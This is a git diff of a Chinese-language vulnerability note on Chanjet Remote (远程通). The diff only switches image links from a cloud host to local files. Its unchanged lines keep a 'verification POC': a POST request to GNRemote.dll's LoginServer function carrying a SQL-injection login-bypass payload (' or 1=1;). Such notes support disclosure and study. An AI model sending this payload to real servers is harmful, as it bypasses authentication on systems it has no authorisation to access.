@@ -20,7 +20,7 @@ body="远程通CHANJET_Remote"
 
 登录页面
 
-![image-20221017171544062](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202210171715136.png)
+![image-20221017171544062](./images/202210171715136.png)
 
 验证POC
 
@@ -30,6 +30,6 @@ POST /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl
 username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
 ```
 
-![image-20221017171557552](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202210171715601.png)
+![image-20221017171557552](./images/202210171715601.png)
 
-![image-20221017171609942](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202210171716987.png)
+![image-20221017171609942](./images/202210171716987.png)
